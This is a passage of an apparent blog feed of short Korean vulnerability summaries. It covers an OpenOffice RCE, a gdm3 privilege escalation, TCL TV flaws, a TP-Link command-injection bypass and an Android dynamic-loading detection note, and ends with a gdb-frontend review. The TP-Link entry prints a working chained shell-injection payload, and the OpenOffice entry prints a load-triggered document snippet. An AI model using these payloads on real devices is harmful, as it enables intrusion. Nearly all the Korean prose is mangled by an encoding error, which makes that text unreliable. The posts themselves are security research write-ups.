ì¶”ê°€ë˜ì–´ í•´ë‹¹ ì•±ì—ì„œ ì„ì˜ ì½”ë“œê°€ ì‹¤í–‰ë©ë‹ˆë‹¤. </p><p>ê³µê²©ìëŠ” Play Core Libraryë¥¼ ì‚¬ìš©í•˜ëŠ” ì•±ì„ íƒ€ê²Ÿìœ¼ë¡œ í•˜ëŠ” ì•…ì„± APKë¥¼ ì œì‘í•˜ê³ , í”¼í•´ìê°€ ì´ë¥¼ ì„¤ì¹˜í•˜ë„ë¡ ìœ ë„í•´ í”¼í•´ìì˜ ë°ì´í„°ë¥¼ íƒˆì·¨í•˜ê±°ë‚˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì€ Google Chromeì„ ë¹„ë¡¯í•œ ì¸ê¸° ì•±ì—ì„œ ì„ì˜ ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•˜ë‹¤ëŠ” ì ì—ì„œ ì‹¬ê°í•œ ì·¨ì•½ì ìœ¼ë¡œ ë¶„ë¥˜ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>android</tag>
      
      <tag>arbitrary code execution</tag>
      
      <tag>L0ch</tag>
      
      <tag>google</tag>
      
      <tag>play core library</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-13958: Apache OpenOffice RCE</title>
    <link href="/2020/11/12/idioth/2020-11-12/"/>
    <url>/2020/11/12/idioth/2020-11-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links">Apache OpenOffice RCE (CVE-2020-13958)</a></p><p><a href="https://github.com/irsl/apache-openoffice-rce-via-uno-links/blob/master/job-offer-CONFIDENTIAL.odt">PoC File</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache OpenOffice 4.0.0 ~ 4.1.7</li><li>Maybe OpenOffice.org versions</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Apache OpenOffice 4ì—ì„œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ LibreOfficeì—ì„œ ë°œê²¬ëœ CVE-2019-9847ê³¼ ìœ ì‚¬í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ í”„ë¡œê·¸ë¨ì—ì„œ <code>script:event-listener</code> í•¸ë“¤ëŸ¬ë¥¼ ë§¤í¬ë¡œ ì‹¤í–‰ìœ¼ë¡œ ì²˜ë¦¬í•˜ì§€ ì•Šì•„ì„œ ë°œìƒí•œ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>ë‹¤ìŒê³¼ ê°™ì€ ìŠ¤í¬ë¦½íŠ¸ë¡œ êµ¬ì„±í•˜ì—¬ OpenOfficeì—ì„œ ì‚¬ìš©í•˜ëŠ” <code>.uno í˜¹ì€ .service</code>ë¥¼ í†µí•´ í™•ì¸ì°½ì´ë‚˜ í´ë¦­ ìœ ë„ ì—†ì´ í•˜ì´í¼ ë§í¬ë¥¼ í†µí•´ URLì„ ì—´ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs vim">&lt;office:scripts&gt;   &lt;office:event-listeners&gt;    &lt;<span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-listener <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:language</span>=<span class="hljs-string">&quot;ooo:script&quot;</span>xlink:href=<span class="hljs-string">&quot;.uno:OpenHyperlinkOnCursor&quot;</span> <span class="hljs-keyword">scrip</span><span class="hljs-variable">t:event</span>-name=<span class="hljs-string">&quot;dom:load&quot;</span>/&gt;   &lt;/office:event-listeners&gt;&lt;/office:scripts&gt;</code></pre><p><code>.uno .service</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ íŠ¸ë¦¬ê±°í•˜ëŠ” ê²ƒì€ ë¦¬ëˆ…ìŠ¤ì—ì„œë„ ë™ì‘í•˜ì§€ë§Œ code executionìœ¼ë¡œ ì´ì–´ì§ˆë§Œí•œ ê²ƒì„ ì°¾ì§€ ëª»í–ˆë‹¤ê³  í•©ë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/">https://www.libreoffice.org/about-us/security/advisories/cve-2019-9847/</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-9847">https://nvd.nist.gov/vuln/detail/CVE-2019-9847</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>idioth</tag>
      
      <tag>openoffice</tag>
      
      <tag>libreoffice</tag>
      
      <tag>arbitrary code execution</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Two CVEs on TCL Android TVs</title>
    <link href="/2020/11/11/fabu1ous/2020-11-11/"/>
    <url>/2020/11/11/fabu1ous/2020-11-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sick.codes/extraordinary-vulnerabilities-discovered-in-tcl-android-tvs-now-worlds-3rd-largest-tv-manufacturer/">Extraordinary Vulnerabilities Discovered in TCL Android TVs</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>TCL android TV </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>TCL android TVì— ëŒ€í•œ CVEë²ˆí˜¸ê°€ 2ê°œ ë°œê¸‰ëìŠµë‹ˆë‹¤. TCLì€ ì¤‘êµ­ ì „ìì œí’ˆ íšŒì‚¬ë¡œ í˜„ì¬ TV ì‹œì¥ì—ì„œ 3ë²ˆì§¸ë¡œ í° ë¹„ì¤‘ì„ ì°¨ì§€í•˜ê³  ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì„ ì œë³´í•œ Sick Codesì™€ John Jacksonì€ ì œì¡°ì‚¬ì˜ ì˜ë„ê°€ ì˜ì‹¬ìŠ¤ëŸ½ë‹¤ëŠ” ë§ì„ ì¡°ì‹¬ìŠ¤ëŸ½ê²Œ í•˜ê³  ìˆìŠµë‹ˆë‹¤. </p><ul><li>CVE-2020-27403 : TVì˜ 7989ë²ˆ í¬íŠ¸ì— ì›¹ì„œë²„ê°€ ë™ì‘í•˜ê³  ìˆìœ¼ë©°,  ë‹¨ìˆœíˆ ì´ê³³ì— ì ‘ì†í•˜ëŠ” ê²ƒ ë§Œìœ¼ë¡œ ëª¨ë“  file systemì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li><li>CVE-2020-28055 : ì•…ì„± apk ë“±ì˜ local unprivileged attackerê°€ critical í•œ ì‹œìŠ¤í…œ ë¦¬ì†ŒìŠ¤ì— ì½ê¸° ë° ì“°ê¸°ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ul><p>7989ë²ˆ í¬íŠ¸ëŠ” unassigned portì…ë‹ˆë‹¤. ì¦‰, íŠ¹ì •í•œ ëª©ì ì´ ë¶€ì—¬ëœ ë²ˆí˜¸ê°€ ì•„ë‹ˆê¸° ë•Œë¬¸ì— 7989ë²ˆ í¬íŠ¸ì— httpë¡œ file systemì„ ë‚´ë³´ë‚¼ ì´ìœ ê°€ ì—†ìŠµë‹ˆë‹¤. ë˜í•œ ì œì¡°ì‚¬ê°€ TVì— ëŒ€í•œ ì™„ë²½í•œ ì›ê²© ì œì–´ê°€  ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><blockquote><p>Please make your own conclusions from our research.</p></blockquote><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://sick.codes/sick-2020-009">https://sick.codes/sick-2020-009</a></p><p><a href="https://sick.codes/sick-2020-012">https://sick.codes/sick-2020-012</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>android tv</tag>
      
      <tag>tcl</tag>
      
      <tag>tv</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16125: Local Privilege Escalation (LPE) in Ubuntu gdm3</title>
    <link href="/2020/11/10/l0ch/2020-11-10/"/>
    <url>/2020/11/10/l0ch/2020-11-10/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://securitylab.github.com/advisories/GHSL-2020-202-gdm3-LPE-unresponsive-accounts-daemon">Local Privilege Escalation (LPE) in Ubuntu gdm3 - CVE-2020-16125</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>gdm version â‰¤ 3.36.3-0ubuntu0.20.04.1</p><p>accountsservice version â‰¤ 0.6.55-0ubuntu12 ~ 20.04.1</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>gdm3ì—ì„œ ì‹œìŠ¤í…œ ê¶Œí•œì˜ ê³„ì •ì„ ë§Œë“¤ì–´ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•œ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>gdm3(gnome display manager)ì€ ê·¸ë˜í”½ ì¸í„°í˜ì´ìŠ¤ë¡œ ë¡œê·¸ì¸ ë° ì‚¬ìš©ì ì¸ì¦ì„ ì²˜ë¦¬í•˜ëŠ”ë°, ìƒˆë¡œ ì„¤ì¹˜ëœ ì‹œìŠ¤í…œ ë“±ì˜ ì´ìœ ë¡œ ì‚¬ìš©ì ê³„ì •ì„ ì°¾ì„ ìˆ˜ ì—†ì„ ë•Œ <code>gnome-initial-setup</code> ì„ í˜¸ì¶œí•˜ê³  sudo ê·¸ë£¹ì˜ ìƒˆë¡œìš´ ê³„ì •ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>gdm3ì—ì„œëŠ” ê¸°ì¡´ ê³„ì •ì„ ì°¾ê¸° ìœ„í•´ D-Bus ë©”ì†Œë“œ í˜¸ì¶œì„ ì‚¬ìš©í•´ <code>accountsservice</code> ë°ëª¬ì˜ <code>look_for_existing_users_sync</code> ì—ì„œ ê¸°ì¡´ ì‚¬ìš©ì ëª©ë¡ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì´ë•Œ ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©ìœ¼ë¡œ <code>accountsservice</code> ë°ëª¬ì´ ì‘ë‹µí•˜ì§€ ì•Šë„ë¡ í•˜ë©´ D-Bus ë©”ì†Œë“œ í˜¸ì¶œì´ ì‹œê°„ ì´ˆê³¼ë¡œ ì¸í•´ ì—°ê²°ì´ ì‹¤íŒ¨í•˜ê³  <code>privâ†’have_existing_user_accounts</code> ì˜ ê¸°ë³¸ê°’ì¸ falseê°€ ìœ ì§€ë©ë‹ˆë‹¤.</p><p>ì´í›„<code>wants_initial_setup</code> ì—ì„œ <code>privâ†’have_existing_user_accounts</code>ê°€ falseë©´ gdm3ëŠ” í˜„ì¬ ì‹œìŠ¤í…œì— ê³„ì •ì´ ì—†ëŠ” ê²ƒìœ¼ë¡œ ì¸ì‹í•˜ê³  <code>gnome-initial-setup</code>ì„ í˜¸ì¶œí•´ ì‹œìŠ¤í…œ ê¶Œí•œì˜ ê³„ì •ì„ ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì˜ íŒ¨ì¹˜ëŠ” <code>priv-&gt;have_existing_user_accounts</code>ì˜ ê¸°ë³¸ê°’ì„ trueë¡œ ìˆ˜ì •í•˜ëŠ” ê²ƒìœ¼ë¡œ ì ìš©ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>lpe</tag>
      
      <tag>L0ch</tag>
      
      <tag>ubuntu</tag>
      
      <tag>gdm3</tag>
      
      <tag>accountsservice</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-10882 Bypass</title>
    <link href="/2020/11/09/idioth/2020-11-09/"/>
    <url>/2020/11/09/idioth/2020-11-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Tokyo2020/minesweeper.md">Pwn2Own Tokyo2020</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>tdpServer daemon(<em>/usr/bin/tdpServer</em>) running on TP-Link Archer A7 and C7(AC1750), hardware version 5, MIPS Arch, firmware ver.200721 and 200628</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>í•´ë‹¹ ì·¨ì•½ì ì€ ë¼ìš°í„°ì˜ LANì— ìˆëŠ” ê³µê²©ìë§Œ ì•…ìš©í•  ìˆ˜ ìˆì§€ë§Œ íŠ¹ë³„í•œ ì¸ì¦ì´ í•„ìš”í•˜ì§€ ì•Šì€ ì·¨ì•½ì ì…ë‹ˆë‹¤.</p><p>CVE-200-10882ì—ì„œ <code>system(systemCmd)</code>ì— ì˜í•´ Command Injection ì·¨ì•½ì ì´ ì¡´ì¬í•˜ì˜€ìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ <code>system()</code> ì‚¬ìš© ëŒ€ì‹  lua ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì´ìš©í•˜ì—¬ <code>lua_onemesh_call(slave_mac)</code>ì„ í†µí•´ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í•¨ìœ¼ë¡œì¨ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. <code>lua_onemesh_call()</code>ì€ <code>luci.controller.admin.onemesh</code> lua ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ë©° ì¸ìˆ˜ë¥¼ ì „ë‹¬í•˜ê³  ìš”ì²­ëœ í•¨ìˆ˜ì˜ í•¸ë“¤ëŸ¬ë¥¼ ì‹¤í–‰í•˜ëŠ”  <code>dispatch</code>ë¼ëŠ” ì´ë¦„ì˜ íŠ¹ë³„í•œ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. ì´ë•Œ <code>sync_wifi_specified(slave_mac)</code>ì´ ì‹¤í–‰ë©ë‹ˆë‹¤. <code>sync_wifi_specified()</code>ëŠ” ë§¤ê°œ ë³€ìˆ˜ë¥¼ <code>target_id</code>ë¡œ <code>printf</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ êµ¬ì„±ë˜ë©° json ë‚´ìš©ìœ¼ë¡œ ì‹¤ì œ ëª…ë ¹ì´ ì‹¤í–‰ë©ë‹ˆë‹¤. jsonì„ escape í•˜ë©´ rootë¡œ ì‹¤í–‰ë˜ëŠ” lua script processì—ì„œ ëª…ë ¹ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;, &quot;timeout&quot;:5, &quot;target_id&quot;:&quot;&lt;Controlled_Parameter&gt;&quot;&#125;&#x27; &amp;</code></pre><p>slave_macì˜ ê²½ìš° <code>strncpy(slave_mac, *(char **)(iVar6 + 0x10), 0x11)</code>ë¡œ ë³µì‚¬ë˜ë©° <code>memset(slave_mac, 0, 0x424)</code>ë¡œ memset ë©ë‹ˆë‹¤. ë˜í•œ ë°”ì´íŠ¸ ì •ë ¬ë¡œ ì¸í•˜ì—¬ slave_mac ë³€ìˆ˜ëŠ” 0x12ë§Œí¼ í• ë‹¹ë˜ë©° 17ìê¹Œì§€ ë¬¸ìë¥¼ ì‚½ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs json">ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;;&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;.&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;/&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`printf &#x27;q&#x27;&gt;&gt;b`&#x27;&quot;&#125;&#x27; &amp;ubus call sync sync_wifi &#x27;&#123;&quot;load&quot;:&quot;/tmp/onemesh_sync_wifi_tmp_json&quot;,&quot;timeout&quot;:5,&quot;target_id&quot;:&quot;&#x27;`sh b`&#x27;&quot;&#125;&#x27; &amp;</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>command injection</tag>
      
      <tag>tp-link</tag>
      
      <tag>lua</tag>
      
      <tag>tdpserver</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Detecting Dynamic Loading in Android App</title>
    <link href="/2020/11/08/fabu1ous/2020-11-08/"/>
    <url>/2020/11/08/fabu1ous/2020-11-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://sayfer.io/blog/dynamic-loading-in-android-applications-with-proc-maps/">Detecting Dynamic Loading in Android Applications With /proc/maps</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Android 10 API 29 ì´ìƒ ë²„ì „</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Android applicationì€ dynamic loadingì„ í†µí•´ run-time ë„ì¤‘ ì–´ëŠ ì‹œì ì—ë¼ë„ ì½”ë“œë¥¼ ë©”ëª¨ë¦¬ì— ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. API level 29ë¶€í„´ ì´ dynamic loadingì„ ì•…ìš©í•´ apkì˜ ì •ì  ê²€ì‚¬ë¥¼ í”¼í•´ ê°€ëŠ” ì•…ì„±ì½”ë“œë“¤ì„ ë§‰ê¸° ìœ„í•´ apkì— ì†í•˜ì§€ ì•Šì€ ì½”ë“œì˜ loadë¥¼ ë§‰ê³  ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ ì—¬ì „íˆ DexClassLoaderì— ì˜í•œ .dex íŒŒì¼ì˜ dynamic loadingì´ ê°€ëŠ¥í•´ ì—¬ì „íˆ ì•…ìš©ì— ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ëª¨ë“  í”„ë¡œì„¸ìŠ¤ëŠ” ê°ê° <code>/proc/[PID]</code>ë¼ëŠ” ë””ë ‰í„°ë¦¬ë¥¼ ê°–ê³ , ê·¸ì¤‘ <code>/proc/[PID]/maps</code>ë¼ëŠ” íŒŒì¼ì€ í”„ë¡œì„¸ìŠ¤ì˜ ë§¤í•‘ëœ ë©”ëª¨ë¦¬ê°€ ê¸°ë¡ë¼ìˆìŠµë‹ˆë‹¤.  ë”°ë¼ì„œ í”„ë¡œì„¸ìŠ¤ê°€ ì–´ë– í•œ íŒŒì¼ì— ì ‘ê·¼í•˜ë©´ <code>/proc/[PID]/maps</code>ì— ê¸°ë¡ì´ ë‚¨ìŠµë‹ˆë‹¤. ì´ ê¸°ë¡ì„ í†µí•´ í”„ë¡œì„¸ìŠ¤ê°€ <code>/data/data</code> ë””ë ‰í„°ë¦¬ ì† .dex ì ‘ê·¼ ì—¬ë¶€ë¥¼ ê²€ì‚¬í•´ dynamic loadingì„ íƒì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://developer.android.com/reference/dalvik/system/DexClassLoader">https://developer.android.com/reference/dalvik/system/DexClassLoader</a></p><p><a href="https://developer.android.com/about/versions/10/behavior-changes-10">https://developer.android.com/about/versions/10/behavior-changes-10</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>android</tag>
      
      <tag>dynamic loading</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] gdb-frontend í¬ë„ˆë¸”ì— ì í•©í•œê°€?</title>
    <link href="/2020/11/08/fabu1ous/gdb-frontend-review/"/>
    <url>/2020/11/08/fabu1ous/gdb-frontend-review/</url>
    
    <content type="html"><![CDATA[<h1 id="5ê°œì›”-ë¬µíŒ-ë§í¬"><a href="#5ê°œì›”-ë¬µíŒ-ë§í¬" class="headerlink" title="5ê°œì›” ë¬µíŒ ë§í¬"></a>5ê°œì›” ë¬µíŒ ë§í¬</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/1.png"></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/2.png"></p><p>ëª‡ ë‹¬ ì „ Fanduí˜•ë‹˜ì´ ì§ì ‘ ì‚¬ìš©í•´ë³´ê³  í›„ê¸°ë¥¼ ì•Œë ¤ë‹¬ë¼ëŠ” ë§ê³¼ í•¨ê»˜ ë§í¬ë¥¼ í•˜ë‚˜ ë˜ì ¸ì£¼ì…¨ìŠµë‹ˆë‹¤. í•  ì¼ë„ ë¬µí˜€ë‘¬ì•¼ ì œë§›! 5ë‹¬ ë™ì•ˆ ê³ ì´ ëª¨ì…”ë†“ì€ GDBFrontend, ë˜¥ì¸ì§€ ëœì¥ì¸ì§€ ì°ì–´ ë¨¹ì–´ ë´…ì‹œë‹¤.</p><h1 id="ì„¤ì¹˜-ë°-ì‹¤í–‰"><a href="#ì„¤ì¹˜-ë°-ì‹¤í–‰" class="headerlink" title="ì„¤ì¹˜ ë° ì‹¤í–‰"></a>ì„¤ì¹˜ ë° ì‹¤í–‰</h1><p><a href="https://github.com/rohanrhu/gdb-frontend">rohanrhu/gdb-frontend</a></p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> &lt;https://github.com/rohanrhu/gdb-frontend.git&gt; gdb-frontend<span class="hljs-built_in">cd</span> gdb-frontend./gdbfrontend</code></pre><p>ê³µì‹ githubì— ë‚˜ì™€ ìˆëŠ” ì„¤ì¹˜ ë°©ë²•ì…ë‹ˆë‹¤. í„°ë¯¸ë„ í‚¤ì‹œê³  ê·¸ëŒ€ë¡œ ì…ë ¥í•˜ì‹œë©´ ë˜ê² ìŠµë‹ˆë‹¤.</p><ol><li>GDB 8.2 ì´ìƒ</li><li>python3</li><li>tmux</li></ol><p>gdb-frontendë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•œ ìš”êµ¬ì‚¬í•­ì€ 3ê°€ì§€ê°€ ìˆëŠ”ë°, ì§€ê¸ˆ ì €ì˜ í™˜ê²½ì€ Ubuntu 20.04ì´ë¯€ë¡œ tmuxë§Œ ì¶”ê°€ë¡œ ì„¤ì¹˜í•´ì£¼ë©´ í™˜ê²½ ì„¸íŒ…ì€ ëì…ë‹ˆë‹¤.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/3.png"></p><p>gdb-frontendë¥¼ ì‹¤í–‰ì‹œí‚¨ í›„ ë¸Œë¼ìš°ì €ë¡œ <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>ì—  ì ‘ì†í•´ì£¼ì‹œë©´ ë©ë‹ˆë‹¤. <code>-w</code> ì˜µì…˜ìœ¼ë¡œ working directoryë„ ì„¤ì •í•´ ì¤„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="íŒŒì´ì–´-í­ìŠ¤ëŠ”-ë‚˜ê°€ìˆì–´"><a href="#íŒŒì´ì–´-í­ìŠ¤ëŠ”-ë‚˜ê°€ìˆì–´" class="headerlink" title="íŒŒì´ì–´ í­ìŠ¤ëŠ” ë‚˜ê°€ìˆì–´"></a>íŒŒì´ì–´ í­ìŠ¤ëŠ” ë‚˜ê°€ìˆì–´</h1><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/4.png"></p><p>ë§Œì•½ íŒŒì´ì–´í­ìŠ¤ë¥¼ ì“°ê³  ê³„ì‹ ë‹¤ë©´ ë‹¤ë¥¸ ë¸Œë¼ìš°ì €ë¥¼ ì‚¬ìš©í•˜ì…”ì•¼ í•©ë‹ˆë‹¤. gdb-frontend serverì™€ì˜ ì—°ê²°ì´ ê³„ì† ëŠê¸°ê¸¸ë˜ ì›ì¸ì„ ì°¾ëŠë¼ ì‹œê°„ ë‚­ë¹„ë¥¼ ì¢€ ë§ì´ í–ˆìŠµë‹ˆë‹¤. ìì£¼ ì• ìš©í•˜ëŠ” gdb í”ŒëŸ¬ê·¸ì¸ pwndbgì™€ì˜ ì¶©ëŒì´ ë¬¸ì œë¼ ìƒê°í•´ pwndbgë„ ì§€ì›Œë³´ê³ , ì•„ì˜ˆ VMì„ ìƒˆë¡œ ìƒì„±í•´ ì²˜ìŒë¶€í„° ë‹¤ì‹œ í™˜ê²½ êµ¬ì¶•í•´ë´¤ì§€ë§Œ ê²°êµ­ íŒŒí­ê³¼ì˜ í˜¸í™˜ ë¬¸ì œì˜€ë„¤ìš”â€¦</p><p><a href="https://github.com/rohanrhu/gdb-frontend/issues/5">tmux.conf invalid settings problem Â· Issue #5 Â· rohanrhu/gdb-frontend</a></p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/5.png"></p><h1 id="gui-í›‘ì–´ë³´ê¸°"><a href="#gui-í›‘ì–´ë³´ê¸°" class="headerlink" title="gui í›‘ì–´ë³´ê¸°"></a>gui í›‘ì–´ë³´ê¸°</h1><pre><code class="hljs bash">$ ./gdbfrontend -w /home/fabu1ous/Desktop/GDBFrontend v0.3.0-gitListening on 127.0.0.1: &lt;http://127.0.0.1:5551/&gt;Open this address <span class="hljs-keyword">in</span> web browser: &lt;http://127.0.0.1:5551/terminal/&gt;</code></pre><p>ë¸Œë¼ìš°ì €ë¡œ ì ‘ì†í•œ <a href="http://127.0.0.1:5551/terminal/"><code>http://127.0.0.1:5551/terminal/</code></a>ì˜ í™”ë©´ì€ gdb shellì´ ë„ì›Œì§„ terminalê³¼ gui ë¶€ë¶„ìœ¼ë¡œ ë‚˜ë‰©ë‹ˆë‹¤. terminal ë¶€ë¶„ì€ gdbì™€ ë‹¤ë¥¼ ê²Œ ì—†ìœ¼ë‹ˆ ë„˜ì–´ê°€ê³ , guiì˜ ê¸°ë³¸ì ì¸ êµ¬ì„±ê³¼ ê¸°ëŠ¥ ì¤‘ ì œê°€ ì¨ë³´ë©´ì„œ ì¢‹ë‹¤ê³  ëŠë‚€ ì ë“¤ì„ ì¨ë³´ê² ìŠµë‹ˆë‹¤.</p><p>[ ! ] ê°œë°œìì˜ ê´€ì ì—ì„œ ë””ë²„ê±°ë¥¼ ì¨ë³¸ ì ì´ ë‹¨ í•œ ë²ˆë„ ì—†ìœ¼ë‹ˆ ìœ ì˜í•˜ì„¸ìš”.</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/6.png"></p><p>í•¨ìˆ˜ ë³„ë¡œ assembly ì½”ë“œë¡œ ì¶œë ¥í•´ì£¼ë©° ë‹¤ìŒì— ì‹¤í–‰ë  ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì€ ì—°í•œ ìƒ‰ìœ¼ë¡œ í•˜ì´ë¼ì´íŠ¸ ë©ë‹ˆë‹¤. ê·¸ì¤‘ì—ì„œë„ Call Stack 0ë²ˆì— ë‚˜íƒ€ë‚˜ëŠ” í•¨ìˆ˜ì˜ í•˜ì´ë¼ì´íŠ¸ ëœ ë¶€ë¶„ì€ eip (í˜¹ì€ rip)ì…ë‹ˆë‹¤. í˜„ì¬ í”„ë¡œê·¸ë¨ íë¦„ì˜ ìœ„ì¹˜ë¥¼ ëŒ€ë‹¨íˆ ì§ê´€ì ìœ¼ë¡œ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê¸€ì¬ì£¼ê°€ ì—†ì–´ì„œ ì´ë ‡ê²Œë°–ì— ì„¤ëª…ì„ ëª» í•˜ê² ë„¤ìš”. ã…ã…</p><p><img src="/2020/11/08/fabu1ous/gdb-frontend-review/7.png"></p><p>break pointëŠ” instructionì˜ 